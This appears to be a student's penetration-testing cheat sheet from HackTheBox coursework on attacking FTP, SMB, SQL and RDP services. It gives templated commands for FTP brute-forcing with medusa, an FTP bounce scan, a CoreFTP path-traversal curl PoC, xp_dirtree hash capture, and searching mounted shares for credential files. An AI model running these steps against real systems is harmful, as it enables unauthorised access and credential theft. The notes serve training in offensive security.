# ATTACKING COMMON SERVICES  

## Attacking FTP

* Port : `21` 
* [FTP footprinting](../HackTheBox/Academy/Footprinting.md)
* Process
    ```bash
    # Process 

    # 1 - Enumeration + footprinting module ftp par
    nmap -sV -sC <IP> -p 21

    # 2 - try anonymous login 
    ftp <IP>

    # 3 - if anonymous is disabled , try bruteforce
    medusa -u <UserName> -P <wordlist> -h <IP> -M ftp 
    # 4 - FTP bounce attack
    nmap -Pn -v -n -p80 -b <Username>:<Password>@<Exposed-Target> <Main-Target-Non-Exposed>
    ```
* latest vulnerabilities
    * CoreFTP Exploitation ( Path transversal vulnerability)
        ```bash
        curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
        # creer whoops et met POC. à l'interieur
        ```

## Attacking SMB

*
* [SMB footprinting](../HackTheBox/Academy/Footprinting.md)
* latest vulnerabilities
    * [SMBGhost (CVE-2020-0796)](https://www.exploit-db.com/exploits/48537)


## Attacking SQL DB
*  [SQL Basics](../HackTheBox/Academy/SQL%20basics.md)
* [ MSSQL footprinting](../HackTheBox/Academy/Footprinting.md)
* latest vulnerabilities
    * MSSQL function xp_dirtree : we can intercept the hash with Wireshark of TCPDump... and localy crack it to gain admin privilege


## Attacking RDP

* latest vulnerabilities : 
    * [CVE-2019-0708](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) 
        * ` Bluekeep ` is  : User-After-Free vulnerability `risk blue screen prevent client during pentest`
        * [Article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)
    

###### SMB
```bash
# connect to share in windows cmd
net use n: \\<IP>\<ShareName> /user:<Username> <Password>
dir \\<IP>\<ShareName>\
# with powershell with credentials
Get-ChildItem \\<IP>\<ShareName>\
$username = '<Username>'
$password = '<Password>'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\<IP>\<ShareName>" -PSProvider "FileSystem"  -Credential $cred

# count number of file powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
# search file powershell
Get-ChildItem -Recurse -Path <DiskPart | N>:\ -Include *<File-Name-Part>* -File

# with windows cmd
dir <Drive-To-search | n>: /a-d /s /b | find /c ":\ "  # ":\" 
# search file windows cmd
dir <Drive-To-search> | n:>\*<File-Name-Part>* /s /b

# search specific word windows cmd
findstr /s /i <Word> <Drive--To-Search | n>:\*.*
# search specific word windows powershell
Get-ChildItem -Recurse -Path <Drive-to-search | N>:\ | Select-String "<Word>" -List


#  mount smb in linux
sudo mkdir /mnt/<ShareName>
sudo apt install cifs-utils
sudo mount -t cifs -o username=<Username>,password=<Password>,domain=. //<IP>/<ShareName> /mnt<ShareName>
# mount with credential file
mount -t cifs //192.168.220.129/<ShareName> /mnt/<ShareName> -o credentials=</path/credentialfile>

#credential file format .(txt)
#username=plaintext
#password=Password123
#domain=.

# search in the share cred files
grep -rn <localSharePath> -ie cred
# search in share a file 
find <localSharePath> -name *<FileNamePart>*
```

###### 

```bash
# install evolution
sudo apt-get install evolution
# if error occur
export WEBKIT_FORCE_SANDBOX=0 && evolution.


```
